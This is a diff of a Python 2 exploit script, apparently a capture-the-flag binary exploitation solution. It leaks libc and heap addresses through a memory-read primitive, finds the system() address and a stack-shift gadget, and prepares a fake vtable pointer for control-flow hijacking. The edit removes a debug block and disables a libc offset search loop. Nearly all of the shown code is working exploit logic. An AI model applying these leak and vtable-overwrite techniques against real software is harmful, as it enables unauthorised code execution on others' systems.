@@ -114,26 +114,10 @@ print "system: 0x" + system[::-1].encode("hex")
 print "system: [" + leak(system).encode("hex")+"]"
 print "shift_stack: [" + leak(shift_stack).encode("hex")+"]"
 
-#Used for leaking libc offsets :)
+#Used for leaking libc offsets
 search = -17021+200
 add = 0
-y='''
-searching... [ffff4881c490] (-17376)
-ffff4881c490
--17376
-
-
-
-print leak(add_to_pointer(exit_addr, -17374)).encode("hex")
-print leak(add_to_pointer(exit_addr, -17370)).encode("hex")
-print leak(add_to_pointer(exit_addr, -17369)).encode("hex")
-print leak(add_to_pointer(exit_addr, -17368)).encode("hex")
-print leak(add_to_pointer(exit_addr, -17367)).encode("hex")
-print leak(add_to_pointer(exit_addr, -17366)).encode("hex")
-print leak(add_to_pointer(exit_addr, -17365)).encode("hex")
-raw_input(123)
-
-while True:
+if 1==0:
 	ret = leak(add_to_pointer(exit_addr, search+add)).encode("hex")
 	print "searching... ["+ret+"] ("+str(search+add)+")"
 	#if "4885ff74" in ret  or "0be986fa" in ret or "ffff660f" in ret or "0f1f44" in ret:#4885ff740be986faffff660f1f44
@@ -150,9 +134,6 @@ while True:
 		add = add - 1
 	else:
 		add = add - len(ret)/2 - 1
-
-raw_input(333)
-'''
 
 #heap addresses
 barbarian_overwriteme_vtable = struct.pack("<Q", leaked_heap-(8*32)) #Address of barbarianOverwriteMe Vtable (print function)
